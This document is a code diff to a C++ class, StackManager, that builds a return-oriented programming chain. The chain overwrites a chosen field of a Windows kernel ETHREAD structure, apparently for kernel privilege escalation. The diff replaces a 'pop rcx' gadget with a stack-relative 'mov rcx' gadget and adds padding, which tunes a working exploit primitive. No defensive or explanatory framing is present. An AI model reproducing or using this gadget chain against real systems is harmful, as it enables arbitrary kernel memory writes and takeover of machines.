@@ -40,13 +40,17 @@ void StackManager::ModifyThreadField(const std::uint64_t FieldOffset, const std:
 	this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
 	this->AddValue(0, "set r8 to 0");
 	this->AddPadding(0x28);
-	this->AddGadget(0x24cd7b, "pop rcx; ret;");
+	this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+	this->AddPadding(0x8);
 	this->AddValue(NewValue, "New field value");
+	this->AddPadding(0x18);
 	this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");
 
 	// rax = Thread + Offset inside of ETHREAD, which we will write to
-	this->AddGadget(0x24cd7b, "pop rcx; ret;");
+	this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+	this->AddPadding(0x8);
 	this->AddValue(FieldOffset, "ETHREAD offset");
+	this->AddPadding(0x18);
 	this->AddGadget(0x263f08, "add rax, rcx; ret;");
 	this->AddGadget(0x3c4eac, "mov qword ptr [rax], r9; ret;");
 }
